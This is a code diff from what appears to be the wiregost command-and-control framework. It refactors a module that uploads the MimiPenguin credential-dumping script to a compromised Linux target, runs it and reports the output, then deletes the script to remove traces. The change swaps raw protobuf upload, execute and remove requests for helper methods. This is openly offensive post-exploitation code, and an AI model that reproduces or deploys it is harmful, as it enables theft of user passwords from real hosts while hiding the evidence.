@@ -17,21 +17,14 @@
 package MimiPenguin
 
 import (
-	"bytes"
-	"errors"
 	"fmt"
-	"io/ioutil"
 	"path/filepath"
 	"strings"
 	"time"
 
-	"github.com/gogo/protobuf/proto"
-
-	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
 	"github.com/maxlandon/wiregost/server/assets"
 	"github.com/maxlandon/wiregost/server/log"
 	"github.com/maxlandon/wiregost/server/module"
-	"github.com/maxlandon/wiregost/util"
 )
 
 // [ Base Methods ] ------------------------------------------------------------------------//
@@ -68,67 +61,37 @@ func (s *MimiPenguin) Run(requestID int32, command string) (result string, err e
 	// Options
 	src := filepath.Join(assets.GetModulesDir(), strings.Join(s.Path, "/"), "src/mimipenguin.sh")
 	rpath := filepath.Join(s.Options["TempDirectory"].Value, "mimipenguin.sh")
+	timeout := time.Second * 30
 
 	// Upload MimiPenguin script on target
-	fileBuf, err := ioutil.ReadFile(src)
+	upload := fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value)
+	s.ModuleEvent(requestID, upload)
+	result, err = s.Upload(src, rpath, timeout)
 	if err != nil {
 		return "", err
-	}
-	uploadGzip := bytes.NewBuffer([]byte{})
-	new(util.Gzip).Encode(uploadGzip, fileBuf)
-
-	data, _ := proto.Marshal(&ghostpb.UploadReq{
-		Encoder: "gzip",
-		Path:    rpath,
-		Data:    uploadGzip.Bytes(),
-	})
-
-	downloading := fmt.Sprintf("Uploading MimiPenguin bash script in %s ...", s.Options["TempDirectory"].Value)
-	s.ModuleEvent(requestID, downloading)
-
-	timeout := time.Second * 30
-	data, err = sess.Request(ghostpb.MsgUploadReq, timeout, data)
-	if err != nil {
-		return "", errors.New(err.Error())
 	} else {
-		s.ModuleEvent(requestID, "Done")
+		s.ModuleEvent(requestID, result)
 	}
 
 	// Execute Script
 	running := fmt.Sprintf("Running script ...")
 	s.ModuleEvent(requestID, running)
 	time.Sleep(time.Millisecond * 500)
-
-	data, _ = proto.Marshal(&ghostpb.ExecuteReq{
-		Path:   rpath,
-		Output: true,
-	})
-	data, err = sess.Request(ghostpb.MsgExecuteReq, timeout, data)
+	result, err = s.Execute(rpath, []string{}, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		resp := ghostpb.Execute{}
-		err := proto.Unmarshal(data, &resp)
-		if err != nil {
-			return "", err
-		}
-
-		res := fmt.Sprintf("Results:\n %s", resp.Result)
-		s.ModuleEvent(requestID, res)
+		s.ModuleEvent(requestID, result)
 	}
 
 	// Delete script
 	deleting := fmt.Sprintf("Deleting script ...")
 	s.ModuleEvent(requestID, deleting)
-
-	data, _ = proto.Marshal(&ghostpb.RmReq{
-		Path: rpath,
-	})
-	data, err = sess.Request(ghostpb.MsgRmReq, timeout, data)
+	result, err = s.Remove(rpath, timeout)
 	if err != nil {
 		return "", err
 	} else {
-		s.ModuleEvent(requestID, "Done")
+		s.ModuleEvent(requestID, result)
 	}
 
 	return "Module executed", nil
